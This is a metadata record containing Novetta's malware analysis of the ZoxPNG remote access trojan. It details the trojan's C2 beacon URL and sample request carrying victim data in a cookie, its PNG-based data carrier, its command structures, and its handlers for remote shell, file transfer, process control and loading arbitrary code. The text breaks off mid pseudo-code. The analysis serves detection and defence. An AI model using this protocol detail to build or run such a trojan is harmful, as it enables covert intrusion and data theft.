{
    "id": "a1507000-8a3d-4fed-a71b-9d5aebea2476",
    "created_at": "2022-10-25T16:48:13.805378Z",
    "updated_at": "2025-03-27T02:12:13.491547Z",
    "deleted_at": null,
    "sha1_hash": "d24ff42b2d02ba406d46f3912f1f7bd2d38b6113",
    "title": "Zoxpng Analysis",
    "authors": "Novetta",
    "file_creation_date": "2014-10-28T02:01:37Z",
    "file_modification_date": "2014-10-28T02:01:37Z",
    "file_size": 571042,
    "plain_text": "# ZoxPNG Analysis\n\n## Overview\nZoxPNG is a very simple RAT that uses the PNG image file format as the carrier for data going\nto and from the C2 server. ZoxPNG supports 13 commands natively. In addition, ZoxPNG has\nthe ability to load and execute arbitrary code from the C2 server providing an almost unlimited\nfeature set. For instance, ZoxPNG provides no functionality for key logging, screen grabbing or\nfile execution. If an attacker required such functionality, the attacker would construct a simple\nshell-code binary which the ZoxPNG binary could execute thereby expanding the feature set of\nthe Trojan.\n\nZoxPNG does not contain any configuration information. The attacker using ZoxPNG must\nspecify the C2 server address as a command line argument.\n\n## ZoxPNG Startup Sequence\nZoxPNG is a simple console executable that contains no configurable information such as a C2\nserver address. It is up to the attacker to provide this information as the sole command line\nargument when activating a ZoxPNG binary. Upon activation, the ZoxPNG binary registers the\nvarious command handlers (see the section “Commands” that follows for details of each\ncommand handler).\n\nWith the handlers registered, ZoxPNG slips into an infinite loop that calls the main\ncommunication and command dispatch routine; if that routine returns (or exits), the Trojan\nsleeps 20 seconds before again calling the main communication and command dispatch\nroutine. This ensures that even if communication failures occur, ZoxPNG will continually attempt\nto connect to the C2 (with intermittent delays).\n\n## Communication and Command Dispatch\nWhen ZoxPNG enters the communication loop, the Trojan sends a request to the C2 server in\nthe form of a HTTP GET request. The first GET request provides the initial dial-home to the C2\nserver and results in the C2 server sending the first command to the ZoxPNG binary via a\nspecial PNG file attached to the response. Subsequent requests from the ZoxPNG binary can\ncome in the form of a GET request if the response to the C2 server’s command does not require\nany data or acknowledgement, or a POST request with a PNG upload containing data to be\nsent to the C2 server. For each request to the C2 server that the ZoxPNG binary generates, the\nC2 server will respond with a valid HTTP response that includes a PNG file containing the next\ninstruction for the binary to execute. Figure 1 provides a graphical representation of the polling\nmodel that the ZoxPNG binary employs when communicating with the C2 server.\n\n\n-----\n\n#### ZoxPNG\n Binary\n\n\n#### ZoxPNG C2 \r Server\n\n\nThe ZoxPNG is surprisingly\naccommodating to network instability.\nFor each polling request to the C2\nserver, the ZoxPNG binary will attempt\nto contact the C2 server up to five times\nbefore failing. Between attempts, the\nZoxPNG binary will wait 5 seconds.\nCoupling the 5 second interval waits\nwith the fact that the default timeout\nusing InternetOpen is 30 seconds, a\nZoxPNG binary could wait up to 175\nseconds (nearly 3 minutes) for a C2\nserver to come online before terminating\nthe session.\n\n\nThe communication subsystem of\nZoxPNG uses the WinInet API. While\nthis has the advantage of offloading the\nHTTP processing, it also has the\nadvantage of allowing ZoxPNG to\nautomatically use any proxy settings\ncurrently configured on the victim’s\nmachine. ZoxPNG uses the\n```\n                         InternetOpen, InternetConnect\n\n```\n_Figure 1: Communication Pattern between ZoxPNG and its C2_\n_Server_ and HttpOpenRequest APIs to begin a\n\nHTTP connection to the C2 server. As\nmentioned previously, if the ZoxPNG binary is sending data to the C2 server,\n```\nHttpOpenRequest is given the POST verb otherwise it uses the GET verb. Prior to using any of\n\n```\nthe WinInet APIs, however, ZoxPNG generates a small data structure of 52 bytes that contains\ninformation about the victim’s machine. The data structure in Figure 2 defines the\nVictimSystemData data structure.\n```\n#pragma pack(push, 1)\nstruct VictimSystemData\n{\n   char fIs64BitProcess;\n   char field_1;  // binary result of an obscure test\n   char bOSMajorVersion;\n   char bOSMinorVersion;\n   DWORD dwActiveCodePage;\n   DWORD dwRandomValue;\n   DWORD dwMegsOfMemory;\n   DWORD dwPID;\n   char szComputerName[32];\n};\n#pragma pack(pop)\n\n```\n_Figure 2: VictimSystemData Structure_\n\n\n-----\n\nIt is unclear why the developer(s) of ZoxPNG decided that it was necessary to generate the data\nstructure at each and every attempt to contact the C2 server instead of generating the static\ndata once and using a cached copy. Nevertheless, the ZoxPNG binary will generate the data\neach time prior to activating the WinInet APIs. The ZoxPNG binary will transmit the data to the\nC2 server via the HTTP header Cookie as part of the SESSIONID value. In order to transfer\nthe data without running into NULL byte issues, the VictimSystemData structure is\ntransformed using a standard Base64 encoding.\n\nThere are two interesting pieces to the VictimSystemData. The first interesting piece is the\ndwRandomValue field. While the field does appear to be the generation of calls to the rand\nfunction, in actuality it is a checksum of the victim’s computer name. The ZoxPNG binary will\nloop through the NULL terminated string of the victim’s computer name in four byte increments\nin order to generate a 32-bit value, use the 32-bit value as the seed value to srand, and then\nmultiply an accumulator by the value of the next rand call. This convoluted checksum appears\nto have no other purpose than to provide a means to detect corrupt or forged requests as they\nrelate only to the computer’s name. After going through a maximum of 30 cycles (leading to the\npossibility that random data may be introduced given that the computer name buffer is only 32\nbytes long), the value of dwRandomValue is truncated to 1,000,000 by virtue of a modulus\noperation. Figure 3 provides the pseudo-code for the dwRandomValue generation.\n```\n  GetComputerNameA(&Buffer, &nSize);\n  v6 = (unsigned int *)&Buffer;\n  victimSysData->dwRandomValue = 1;\n  i = 1;\n  do\n  {\n   if ( !*v6 )\n    break;\n   srand(*v6);\n   ++i;\n   ++v6;\n   victimSysData->dwRandomValue *= rand();\n  }\n  while ( i < 30 );\n  victimSysData->dwRandomValue %= 1000000u;\n\n```\n_Figure 3: dwRandomValue Generation in Psuedo-C_\n\nWith the VictimSystemData structure generated and an Internet session handle opened,\nZoxPNG calls HttpOpenRequest with the appropriate verb to open a specific URL to the C2\nserver. The URL that the ZoxPNG binary will request is largely static and takes the form of a\ncomplex image request. The request to the C2 server takes the following form:\n\n\n-----\n\n```\nhttp://{C2 Address}/imgres?q=A380&hl=enUS&sa=X&biw=1440&bih=809&tbm=isus&tbnid=aLW4J8Q1lmYBM:&imgrefurl=http://{C2Address}&docid=1bi0Ti1ZVr4bEM&imgurl=http\n://{C2 Address}/{4 digit year}-{2 digit month}/{4 digit year}{2 digit month}{2 digit day}{2 digit\n\n```\nhour}{2 digit minute}{2 digit\nsecond}.png&w=800&h=600&ei=CnJcUcSBL4rFkQX444HYCw&zoom=1&ved=1t:3588,r:\n```\n1,s:0,i:92&iact=rc&dur=368&page=1&tbnh=184&tbnw=259&start=0&ndsp=20&tx\n=114&ty=58\n\n```\nAfter opening a HTTP request to the URL, the ZoxPNG will add a User-Agent header based on\nthe user-agent string returned by a call to the ObtainUserAgentString API function. If that\nfunction fails to return a user-agent, then ZoxPNG will default to the following user-agent string:\n```\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0;\nSLCC2; .NETCLR 2.0.50727)\n\n```\nThe ZoxPNG binary will also append Pragma, Accept-Language and Accept-Encoding\nheaders before concluding with a Connection: Close header. The result is a request that\ntakes the form of:\n```\nGET /imgres?q=A380&hl=en-US&sa=X&biw=1440&bih=809&tbm=isus&tbnid=aLW4J8Q1lmYBM:&imgrefurl=http://127.0.0.1&docid=1bi0Ti1ZVr4bEM&imgurl=http\n://127.0.0.1/201410/20141020021012.png&w=800&h=600&ei=CnJcUcSBL4rFkQX444HYCw&zoom=1&ved\n=1t:3588,r:1,s:0,i:92&iact=rc&dur=368&page=1&tbnh=184&tbnw=259&start=0\n&ndsp=20&tx=114&ty=58 HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;\nTrident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR\n3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)\nPragma: no-cache\nAccept-Language: en-US\nAccept-Encoding: gzip, deflate\nConnection: Close\nCookie:\nSESSIONID=AAAFAeQEAAAEZgcAYggAAMAFAABJMjY4ODU2LTM3NUMzMTcAAAAAAAAAAAAA\nAAAAAAAAAA==\nHost: 127.0.0.1\n\n```\nZoxPNG transmits data via a specifically constructed PNG file. The format of the PNG file that\ncarries data to and from the C2 server is relatively straight forward. For data coming from the C2\nserver, the PNG file must start with the following bytes in order: 0x89, 0x50, 0x4E, 0x47,\n```\n0x0D, 0x0A, 0x1A, 0x0A. The DWORD starting at offset 0x21 contains the size of the data\n\n```\nwithin the PNG file while the data begins at offset 0x29. The DWORD at 0x21 is in big-endian\nformat. The data at offset 0x29 is compressed using the zlib `deflate` (version 1.1.4) system.\nNovetta was unable to observe a live sample of the PNG file originating from the C2 but it is\nreasonable to believe that the overall format of the PNG file is the same as the format as the\nPNG file that the ZoxPNG binary sends to the C2 server as the important offsets of 0x21 (33)\nand 0x29 (41) are identical.\n\n\n-----\n\nThe format of the PNG file originating at the ZoxPNG binary is defined, which could be\npotentially leveraged by IDS. The following table defines the known values of the PNG file\n(regardless of the data appended):\n\n**Offset** **Known Values** **Notes**\n**0 (8 bytes)** `0x89 0x50 0x4E 0x47 0x0D 0x0A` PNG header\n```\n         0x1A 0x0A\n\n```\n**8 (4 bytes)** `0x00 0x00 0x00 0x0D` Length of image header\nchunk\n**12 (4 bytes)** ‘IHDR’ Image header tag\n**16 (13 bytes)** `0x00 0x00 0x00 0xC8 0x00 0x00` Specifies 200x100px 8-bit\n`0x00 0x64 0x08 0x00 0x00 0x00` image\n```\n         0x00\n\n```\n**29 (4 bytes)** `0xE6 0xED 0x20 0xD7` CRC32 value of IHDR chunk\n**33 (4 bytes)** variable Size of IDAT (embedded\ndata) chunk\n**37 (4 bytes)** ‘IDAT’ Data header tag\n**41 (n bytes)** variable Embedded data of n bytes\n**41+n (4 bytes)** variable CRC32 value of IDAT chunk\n**45+n (4 bytes)** `0x00 0x00 0x00 0x00` Length of IEND chunk\n**49+n (4 bytes)** ‘IEND’ Image end tag\n**53+n (4 bytes)** `0xAE 0x42 0x60 0x82` CRC32 value of IEND chunk\n\nNote that the embedded data within the IDAT tag is compressed using the deflate function. In\norder to restore the IDAT data, both sides of the conversation will use the zlib inflate\nfunctionality.\n\nThe PNG file adheres to the PNG standard thereby making it less detectible to heuristic\nsensors. However, by inspection of the IDAT’s size, it could be possible to determine that the\nimage is not 200x100 bytes (20000 bytes) and therefore the IDAT section is not the proper size\nfor the specific image size.\n\nAfter the PNG image is received by the ZoxPNG binary, the binary will extract the contents of\nthe IDAT section, recover the original data blob, and send the data to the command dispatch.\nEach data blob that comes from a PNG file contains a header that allows the command dispatch\nsystem to quickly route the data blob to the appropriate handler. At the outer most layer of the\nstructure is the CommandHeader which contains two fields: dwCommandDataSize and\ncommand. dwCommandDataSize is the overall size of the data blob including the\n```\nCommandHeader component while the command field is a CommandData structure containing\n\n```\nthe information necessary to route the command (and its data) to the appropriate data handler.\nFigure 4 defines both the CommandHeader and CommandData structures.\n\nThe CommandData structure contains four fields of which the most important is the\n```\ndwCommandID field. The dwCommandID field defines the purpose of the data (if any) that\n\n```\nfollows the CommandData (and by extension, the CommandHeader) structure in the data blob.\nThe dwCommandID value corresponds to one of the registered command handler ID values\n(starting at 0x80061001). If a specific command requires additional arguments then the\n\n|Offset Known Values Notes|Col2|Col3|\n|---|---|---|\n|0 (8 bytes)|0x89 0x50 0x4E 0x47 0x0D 0x0A 0x1A 0x0A|PNG header|\n|8 (4 bytes)|0x00 0x00 0x00 0x0D|Length of image header chunk|\n|12 (4 bytes)|‘IHDR’|Image header tag|\n|16 (13 bytes)|0x00 0x00 0x00 0xC8 0x00 0x00 0x00 0x64 0x08 0x00 0x00 0x00 0x00|Specifies 200x100px 8-bit image|\n|29 (4 bytes)|0xE6 0xED 0x20 0xD7|CRC32 value of IHDR chunk|\n|33 (4 bytes)|variable|Size of IDAT (embedded data) chunk|\n|37 (4 bytes)|‘IDAT’|Data header tag|\n|41 (n bytes)|variable|Embedded data of n bytes|\n|41+n (4 bytes)|variable|CRC32 value of IDAT chunk|\n|45+n (4 bytes)|0x00 0x00 0x00 0x00|Length of IEND chunk|\n|49+n (4 bytes)|‘IEND’|Image end tag|\n|53+n (4 bytes)|0xAE 0x42 0x60 0x82|CRC32 value of IEND chunk|\n\n\n-----\n\n```\ndwPayloadSize field will be greater than 0. The dwPayloadSize field specifies the number\n\n```\nof bytes following the CommandData structure. The dwCommandSequenceID and\n```\ndwLastError fields are largely ignored by the various commands. \nstruct CommandHeader\n{\n DWORD dwCommandDataSize;\n CommandData command;\n};\nstruct CommandData\n{\n DWORD dwCommandID;\n DWORD dwCommandSequenceID;\n DWORD dwLastError;\n DWORD dwPayloadSize;\n};\n\n```\n_Figure 4: CommandHeader and CommandData Structure Definitions_\n\nWhenever a command sends any data back to the C2 server, the same CommandHeader and\n```\nCommandData fields are prepended to the data blob coming from the various commands. In the\n\n```\ncase where data is going back to the C2 server, it is possible that the dwLastError field may\nbe set to a non-zero value indicating the status of a particular command (the field is commonly\nset to the value returned by the function GetLastError). The dwCommandSequenceID\nnumber field is set to the same value as the command whenever the ZoxPNG binary sends data\nto the C2 server.\n\nThe data that follows a CommandData field is specific to each command. The command\ndispatch is ignorant of any data that follows beyond the CommandHeader and CommandData.\nThe commands themselves are ignorant of the CommandHeader as only the CommandData is\nsent to the individual command handlers.\n\n## Commands\nZoxPNG uses a notion of function registration to assign command handlers to specific,\nsequential IDs. The order in which the handlers are registered dictates the ID of the command.\nThe ID values start at 0x80061001 and increment for each subsequent handler that is\nregistered. The following ID to function mappings have been observed:\n\n\n-----\n\n**ID** **Function Description**\n`0x80061001` Initiate a remote shell\n`0x80061002` Interact with the remote shell (send command, read response)\n`0x80061003` Download a file from the C2 to the victim’s machine\n`0x80061004` Upload a file to the C2 from the victim’s machine\n`0x80061005` Obtain information about the attached drives\n`0x80061006` Create a directory\n`0x80061007` Find/List files\n`0x80061008` Delete a file\n`0x80061009` Move/Rename a file\n`0x8006100A` List all activate processes\n`0x8006100B` Kill a process (by PID)\n`0x8006100C` Sleep\n`0x8006100D` Add a new handler function\n`0x8006100E` Shutdowns ZoxPNG\n\nEach command has a command-specific data format for arguments and responses. Not all\ncommands require arguments or provide responses. The following sub-sections break down not\nonly the format of the data flowing into and out of each command but also provide an overview\nof what each command does and how it operates.\n\n### Command 0x80061001: Initiate Remote Shell\nThe Initiate Remote Shell command takes a single argument which contains the full\nfilename and path to the command interpreter (e.g. cmd.exe) to use for the remote shell. Once\nactivated, the command handler terminates any existing remote shell processes and closes any\nopen pipes going to the remote shell process. The handler then creates new pipes before\ngenerating a new remote shell process and using the newly created pipes for the STDIN,\n```\nSTDOUT and STDERR of the console process. If the CreateProcess call returns an error, the\n\n```\ncommand handler will generate a response with the following fields within the CommandData\nset:\n\n**Field** **Value**\n```\ndwCommandID 0x80061001\n\n```\n`dwLastError` value from GetLastError\n`dwPayloadSize` size of the string in the payload\n`(payload)` string: “IISCMD Error:%d\\n” where %d is the value from\n```\n         GetLastError\n\n```\nIf CreateProcess is successful, the command handler calls the command handler for Remote\n```\nShell Interaction (0x80061002) and pass the original CommandData to the command\n\n```\nhandler with the dwCommandID field changed to 0x80061002 and the dwPayloadSize set to\n```\n0 in order to get the initial response from the remote shell to the C2 server. Typically this initial\n\n```\nresponse will be the banner and command prompt from a newly executed cmd.exe. The\ncommand handler will return the response from the Remote Shell Interaction handler as\nits own.\n\n|ID Function Description|Col2|\n|---|---|\n|0x80061001|Initiate a remote shell|\n|0x80061002|Interact with the remote shell (send command, read response)|\n|0x80061003|Download a file from the C2 to the victim’s machine|\n|0x80061004|Upload a file to the C2 from the victim’s machine|\n|0x80061005|Obtain information about the attached drives|\n|0x80061006|Create a directory|\n|0x80061007|Find/List files|\n|0x80061008|Delete a file|\n|0x80061009|Move/Rename a file|\n|0x8006100A|List all activate processes|\n|0x8006100B|Kill a process (by PID)|\n|0x8006100C|Sleep|\n|0x8006100D|Add a new handler function|\n|0x8006100E|Shutdowns ZoxPNG|\n\n|Field Value|Col2|\n|---|---|\n|dwCommandID|0x80061001|\n|dwLastError|value from GetLastError|\n|dwPayloadSize|size of the string in the payload|\n|(payload)|string: “IISCMD Error:%d\\n” where %d is the value from GetLastError|\n\n\n-----\n\n### Command 0x80061002: Remote Shell Interaction\nThe Remote Shell Interaction command is responsible for both polling for waiting remote\nshell output as well as providing input to the remote shell. When activated, the Remote Shell\n```\nInteraction command handler determines if the pipe for the STDIN is still valid (non-NULL).\n\n```\nIf the pipe is invalid, the command handler will generate a response with the following fields\nwithin the CommandData set:\n\n**Field** **Value**\n```\ndwCommandID 0x80061002\n\n```\n`dwLastError` value from GetLastError\n`dwPayloadSize` size of the string in the payload\n`(payload)` string: “hWritePipe2 Error:%d\\n” where %d is the value from\n```\n         GetLastError\n\n```\nIf the pipe handle is still valid, and the CommandData’s dwPayloadSize value is non-zero, the\npayload data that follows the CommandData structure is passed to the remote shell via the pipe\nwithout translation by means of a call to WriteFile.\n\nAfter a 500ms sleep, a new buffer of 65564 bytes is allocated by the command handler in order\nto hold any response data. A call to PeekPipe is made to determine if there is any output from\nthe remote shell waiting. If PeekPipe indicates the presence of waiting data, a call to\n```\nReadFile is made to copy up to 65536 bytes of the output into the payload portion of the\n\n```\nresponse buffer. The command handler returns the response with the CommandHeader set to\nthe size of the entire data blob and the following fields set within the CommandData structure:\n\n**Field** **Value**\n```\ndwCommandID 0x80061002\ndwLastError 2\n\n```\n`dwPayloadSize` size of the data in the payload (or 0 if no data was waiting)\n`(payload)` (optional) Data from the remote shell’s output (STDOUT or STDERR)\n\n### Command 0x80061003: Download File\nThe Download File command, as the name implies, is responsible for transferring a file from\nthe C2 server to the victim’s machine. The payload of the data blob contains a data structure\ndefining the filename (and destination) of the file being transferred, the number of bytes within\nthe payload to write to the victim’s machine and the offset (if any) to start writing the payload\ndata. The format of the command’s argument structure is as follows:\n\n|Field Value|Col2|\n|---|---|\n|dwCommandID|0x80061002|\n|dwLastError|value from GetLastError|\n|dwPayloadSize|size of the string in the payload|\n|(payload)|string: “hWritePipe2 Error:%d\\n” where %d is the value from GetLastError|\n\n|Field Value|Col2|\n|---|---|\n|dwCommandID|0x80061002|\n|dwLastError|2|\n|dwPayloadSize|size of the data in the payload (or 0 if no data was waiting)|\n|(payload)|(optional) Data from the remote shell’s output (STDOUT or STDERR)|\n\n\n-----\n\n|Offset in Field Name Description Payload|Col2|Col3|\n|---|---|---|\n|0 (WORD)|wFilenameLength|Length of the szFilename field|\n|2 (variable)|szFilename|Full filename and path of file to write|\n|2+szFilename (DWORD)|dwDataOffset|Offset within file to begin writing data|\n|6+szFilename (DWORD)|dwBytesToWrite|Number of bytes to write to disk|\n|10+szFilename (variable)|(data)|Bytes to write to disk|\n\n\nIf the dwDataOffset field is non-zero, then the disposition for the CreateFile call is set to\n```\nOPEN_EXISTING whereas if the field is zero, then a new file is created by using\nCREATE_ALWAYS. If the CreateFile call is successful, the command handler calls\nSetFilePointer to the value specified by dwDataOffset and then calls WriteFile in\n\n```\norder to write the dwBytesToWrite number of bytes to disk.\n\nThe command handler returns a CommandHeader structure with the dwCommandID field of the\n```\nCommandData structure set to 0x80061003 to the command dispatch. If the CreateFile call\n\n```\nis successful then the dwLastError field is set to 0 otherwise the field is set to the value\nreturned by GetLastError.\n\n### Command 0x80061004: Upload File\nThe Upload File command copies the contents of a file on the victim’s machine to the C2\nserver. The payload of the data blob contains a data structure (identical to the data structure for\nthe Download File command) defining the full filename and path of the file being transferred,\nthe number of bytes to read from the file and the offset (if any) to start reading from within the\nfile. The format of the command’s argument structure is as follows:\n\n**Offset in** **Field Name** **Description**\n**Payload**\n\n`0 (WORD)` `wFilenameLength` Length of the szFilename field\n`2 (variable)` `szFilename` Full filename and path of file to write\n`2+szFilename` `dwDataOffset` Offset within file to begin reading data\n```\n(DWORD)\n\n```\n`6+szFilename` `dwBytesToRead` Number of bytes to read from the file.\n```\n(DWORD)\n\n```\nThe command handler begins by calling CreateFile with the disposition set to\n```\nOPEN_EXISTING. If the CreateFile call is unsuccessful, the command handler returns a\nCommandHeader structure with the dwCommandID field of the CommandData structure set to\n0x80061004 and the dwLastError field is set to the value returned by GetLastError. \n\n```\nIf the dwBytesToRead is -1, the command handler will calculate the number of bytes to read\nfrom the file by taking the total file size (as reported by GetFileSize) and subtracting the\nvalue of the dwDataOffset field. The command handler will allocate a response buffer with\nenough space to read in the specified number of bytes of the file along with a response header\n\n|Offset in Field Name Description Payload|Col2|Col3|\n|---|---|---|\n|0 (WORD)|wFilenameLength|Length of the szFilename field|\n|2 (variable)|szFilename|Full filename and path of file to write|\n|2+szFilename (DWORD)|dwDataOffset|Offset within file to begin reading data|\n|6+szFilename (DWORD)|dwBytesToRead|Number of bytes to read from the file.|\n\n\n-----\n\nconsisting of a CommandHeader along with a 12 byte payload header. The format of the\nresponse buffer, following the CommandHeader, is as follows:\n\n**Offset in** **Field Name** **Description**\n**Payload**\n\n`0 (DWORD)` `dwFileSize` Total size of the file being transferred\n`4 (DWORD)` `dwReadOffset` Offset within file corresponding to the start of\nthe data within the payload\n`8 (DWORD)` `dwBytesRead` Number of bytes read from the file\n`12 (variable)` `(data)` Bytes read from the file\n\nAfter moving the file pointer by calling SetFilePointer and supplying the value of the\n```\ndwDataOffset field, the command handler will read the file (up to the number of calculated\n\n```\nbytes to read) into the (data) section of the response buffer by calling ReadFile. Regardless of\nthe success of the file read, the command handler sets the dwFileSize, dwReadOffset and\n```\ndwBytesRead fields appropriately and returns the response buffer to the command dispatch. \n\n### Command 0x80061005: Get Drive Information\n```\nThe Get Drive Information command provides a list of each letter assigned drive on the\nvictim’s machine along with some limited information concerning each drive. The command\nhandler requires no arguments. When activated, the command handler will call the\n```\nGetLogicalDriveStrings function in order to obtain a list of assigned drive letters. After\n\n```\nallocating a response buffer large enough to contain a CommandHeader and the necessarily\ninformation structures to describe each drive, the command handler begins filling out a\n```\nDriveInfo data structure for each drive and placing the structure within the payload of the\n\n```\nresponse buffer. The DriveInfo structure is defined as:\n```\nstruct DriveInfo\n{\n  DWORD dwDriveNumber;\n  char szDriveLetter[4];\n  DWORD dwDriveType;\n  ULARGE_INTEGER qwTotalBytes;\n  ULARGE_INTEGER dwTotalFreeBytes;\n};\n\n```\nThe dwDriveType field contains the value returned from a call to GetDriveType while\n```\nqwTotalBytes and qwTotalFreeBytes come from a call to GetDiskFreeSpaceEx. \n\n```\nAfter completing the array of DriveInfo structures for each assigned drive letter, the\ncommand handler will set the dwCommandID field within the CommandData structure to\n```\n0x80061005 and return the response buffer. If, however, the call to GetLocalDriveStrings\n\n```\nreturns an error, the command handler will return only a CommandHeader structure with the\n```\ndwCommandID field set to 0x80061005 and the dwLastError set to the return value from\nGetLastError. \n\n```\n|Offset in Field Name Description Payload|Col2|Col3|\n|---|---|---|\n|0 (DWORD)|dwFileSize|Total size of the file being transferred|\n|4 (DWORD)|dwReadOffset|Offset within file corresponding to the start of the data within the payload|\n|8 (DWORD)|dwBytesRead|Number of bytes read from the file|\n|12 (variable)|(data)|Bytes read from the file|\n\n\n-----\n\n### Command 0x80061006: Create Directory\nThe Create Directory command creates a directory on the victim’s machine. The command\nhandler uses the payload section of the data blob (the section following the CommandHeader\nand CommandData structures) as a NULL-terminating string containing the full path of the\ndirectory to create. The command handler uses the CreateDirectory function to create the\ndirectory on the victim’s machine. The command handler then returns a CommandHeader with\nthe dwCommandID set to 0x80061006, the dwPayloadSize set to 0 and, if the\n```\nCreateDirectory function was successful, the dwLastError set to 0 otherwise the field is\n\n```\nset to the value returned from GetLastError.\n\n### Command 0x80061007: Enumerate Files\nThe Enumerate Files command provides a list of files for a given path on the victim’s\nmachine along with some limited information concerning each file found. The command handler\nuses the payload section of the data blob (the section following the CommandHeader and\n```\nCommandData structures) as a NULL-terminating string containing the full path to enumerate.\n\n```\nWhen activated, the command handler determine the number of files in the given path by using\nthe FindFirstFile and FindNextFile functions to count the number of results.\n\nUsing the number of files within the specified directory, the command handler will allocate a\nresponse buffer large enough to contain a CommandHeader and the necessarily information\nstructures to describe each file. The command handler begins filling out a FileInfo data\nstructure for each file, placing the structure within the payload of the response buffer. The\n```\nFileInfo structure is defined as:\nstruct FileInfo\n{\n  DWORD dwFileAttributes;\n  FILETIME ftLastWriteTime;\n  DWORD nFileSizeLow;\n  DWORD nFileSizeHigh;\n  char szFilename[260];\n};\n\n```\nThe dwFileAttributes field contains a bitmask of FILE_ATTRIBUTE_* values,\n```\nftLastWriteTime contains the timestamp of the last time the file was modified,\nnFileSizeLow and nFileSizeHigh collectively define the size of the file and\nszFilename contains a NULL-terminate string with the file’s name. \n\n```\nAfter completing the array of FileInfo structures for each found file (via calls to\n```\nFindFirstFile and FindNextFile), the command handler will set the dwCommandID field\n\n```\nwithin the CommandData structure to 0x80061007 and return the response buffer. If, however,\nthe command handler is unable to allocate the proper sized response buffer or if the number of\nfiles for the specified directory is zero, the command handler will return only a CommandHeader\nstructure with the dwCommandID field set to 0x80061007 and the dwLastError set to the\nreturn value from GetLastError.\n\n\n-----\n\n### Command 0x80061008: Delete File\nThe Delete File command deletes a file on the victim’s machine. The command handler\nuses the payload section of the data blob (the section following the CommandHeader and\n```\nCommandData structures) as a NULL-terminating string containing the full filename and path of\n\n```\nthe file to delete. The command handler uses the SHFileOperation function with the\n```\nSHFILEOPSTRUCT.wFunc parameter set to FO_DELETE to delete the file on the victim’s\n\n```\nmachine. The command handler then returns a CommandHeader with the dwCommandID set to\n```\n0x80061008, the dwPayloadSize set to 0 and, if the operation was successful, the\ndwLastError set to 0 otherwise the field is set to the value returned from GetLastError.\n\n### Command 0x80061009: Rename/Move File\n```\nThe Rename/Move File command renames (and potentially moves) a file on the victim’s\nmachine. The command handler uses the payload section of the data blob (the section following\nthe CommandHeader and CommandData structures) as a NULL-terminating string containing\nthe both the full filename and path of the file to rename as well as the full filename and path of\nthe new name for the file. A pipe character (|) separates the two values within the string.\n\nThe command handler uses the MoveFileEx function to rename/move the file on the victim’s\nmachine. The command handler then returns a CommandHeader with the dwCommandID set to\n```\n0x80061009, the dwPayloadSize set to 0 and, if the operation was successful, the\ndwLastError is set to 0; otherwise the field is set to the value returned from GetLastError.\n\n```\nIf the supplied NULL-terminated string does not contain a pipe character, thereby not supplying\nto filenames and paths, the dwLastError field is set to 87 (ERROR_INVALID_PARAMETER).\n\n### Command 0x8006100A: Enumerate Processes\nThe Enumerate Processes command provides a list of processes running on a victim’s\nmachine for a given path on the victim’s machine along with user running the process, the PID\nof the process and the terminal server session (if any) associated with the process. The\ncommand handler requires no arguments. When activated, the command handler obtains a list\nof active processes on the victim’s machine by calling WTSEnumerateProcesses. By using\n```\nWTSEnumerateProcesses instead of the more common Process32First and\nProcess32Next functions, the Enumerate Processes command can also list processes\n\n```\nassociated with terminal server sessions.\n\nUsing the number of processes returned by the WTSEnumerateProcesses call, the command\nhandler will allocate a response buffer large enough to contain a CommandHeader and the\nnecessarily information structures to describe each process. The command handler begins\nfilling out a ProcessInfo data structure for each process, placing the structure within the\npayload of the response buffer. The ProcessInfo structure is defined as:\n\n\n-----\n\n```\nstruct ProcessInfo\n{\n  DWORD dwPID;\n  DWORD dwSessionID;\n  DWORD bIs64BitProcess;\n  char szUsername[32];\n  char szProcessName[260];\n};\n\n```\nThe dwPID field identifies the process ID for the process and dwSessionID identifies the\nterminal server session associated with the process. If the process is a 64-bit image, the\n```\nbIs64BitProcess field is set to 1 otherwise it is set to 0. Using the SID associated with the\n\n```\nprocess, the command handler will look up the username responsible for the process and place\nthe value in the szUsername field. Lastly, the szProcessName field contains the full name\nof the process.\n\nAfter completing the array of ProcessInfo structures for each found process, the command\nhandler will set the dwCommandID field within the CommandData structure to 0x8006100A and\nreturn the response buffer. If, however, the WTSEnumerateProcesses function was\nunsuccessful, the command handler will return only a CommandHeader structure with the\n```\ndwCommandID field set to 0x8006100A and the dwLastError set to the return value from\nGetLastError.\n\n### Command 0x8006100B: Kill Process\n```\nThe Kill Process command will terminate a process specified by its PID. The DWORD that\nimmediately follows the CommandHeader (and CommandData) structure specifies the PID of\nthe process to terminate. The command handler will attempt to open a handle to the process by\ncalling OpenProcess and then terminate the process by calling TerminateProcess. The\ncommand handler then returns a CommandHeader with the dwCommandID set to 0x8006100B,\nthe dwPayloadSize set to 0 and, if both the OpenProcess and TerminateProcess calls\nwere successful, the dwLastError set to 0 otherwise the field is set to the value returned from\n```\nGetLastError. \n\n### Command 0x8006100C: Sleep\n```\nThe Sleep command temporarily suspends the communication loop of the ZoxPNG binary for a\nspecified period of time. The DWORD that immediately follows the CommandHeader (and\n```\nCommandData) structure specifies the parameter for the Sleep function. If the parameter to the\nSleep command is 0xFFFFFFFF, then the ZoxPNG communication loop will suspend\n\n```\nindefinitely. The command does not return a response.\n\n\n-----\n\n### Command 0x8006100D: Add/Update Command\nThe Add/Update Command command allows the ZoxPNG to expand its capabilities by\ninstalling load-on-demand subroutines to the running ZoxPNG process. The command handler\nuses the payload data that immediately follows the CommandHeader structure from the C2\nserver, allocates enough memory to copy the entirety of the payload (minus four bytes), and\nthen copies the payload starting at offset 4 to the newly generated buffer. The first four bytes (a\nDWORD) of the payload contains the desired command ID for the new command.\n\nThe command handler calls the new function which will return a pointer to the real command\nhandler that is being installed. This indicates that the data coming from the C2 server is an\ninstaller subroutine that loads the necessary DLLs and API functions and returns a pointer to the\nnew command handler. If the subroutine returns a valid (non-NULL) pointer, the Add/Update\n```\nCommand command handler attempts to install the new command handler. \n\n```\nThe command handler attempts to install the new command handler into the array of existing\ncommand handlers (pfnHandlers[]) using the desired command ID (desiredCmdID value).\nFigure 5 illustrates, in pseudo-C, the procedure that the Add/Update Command command\nhandler install the new command handler.\n```\n memcpy(installerFunction, &data[1], data->header.dwPayloadSize - 4);\n pFunc = installerFunction();\n if (pFunc)\n {\n  desiredCmdID = 